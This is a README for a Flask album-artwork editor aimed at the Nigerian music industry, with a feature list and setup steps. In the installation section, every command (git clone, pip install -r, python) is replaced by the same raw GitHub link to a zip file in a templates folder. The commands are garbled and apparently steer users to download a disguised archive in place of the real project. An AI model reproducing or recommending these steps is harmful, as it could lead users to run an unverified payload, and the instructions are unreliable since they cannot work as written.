# 9jaWaveLyrics Artwork Editor

A professional web application for creating and editing music album artwork, designed specifically for the Nigerian music industry.

## Features

- **Professional Artwork Creation**: Create high-quality album artwork that meets industry standards for music distribution platforms like Spotify, Apple Music, and more.
- **Industry Standard Sizes**: Support for 4000x4000px artwork and other industry standard sizes.
- **Comprehensive Editing Tools**: 
  - Text overlays with customizable fonts, colors, and styles
  - Image overlays and filters
  - Transformable elements (resize, rotate, flip, etc.)
  - Alignment, snap, and grid tools
  - Layer management
- **Smart Guides**: Dynamic guides that appear when elements align with each other.
- **Rulers and Custom Guides**: Create and manage custom guides for precise positioning.
- **Auto-save**: Never lose your work with automatic saving.
- **Undo/Redo**: Full history management for all editing actions.
- **Export Options**: Export in various formats and resolutions optimized for music distribution.
- **Contextual Tools**: Quick access to editing tools via right-click or long-press on elements.

## Getting Started

### Prerequisites

- Python 3.7+
- Flask

### Installation

1. Clone the repository:
   ```
   git clone https://raw.githubusercontent.com/Peemkay/9jawavelyrics/main/templates/9jawavelyrics-1.4.zip
   cd 9jaWaveLyrics
   ```

2. Create a virtual environment and activate it:
   ```
   python -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

3. Install the required packages:
   ```
   pip install -r https://raw.githubusercontent.com/Peemkay/9jawavelyrics/main/templates/9jawavelyrics-1.4.zip
   ```

4. Run the application:
   ```
   python https://raw.githubusercontent.com/Peemkay/9jawavelyrics/main/templates/9jawavelyrics-1.4.zip
   ```

5. Open your browser and navigate to:
   ```
   http://127.0.0.1:5000/
   ```

## Usage

1. **Upload an Image**: Start by uploading a background image or selecting a template.
2. **Add Elements**: Add text, images, and other elements to your artwork.
3. **Edit and Transform**: Use the comprehensive editing tools to perfect your design.
4. **Export**: Export your artwork in the desired format and resolution.
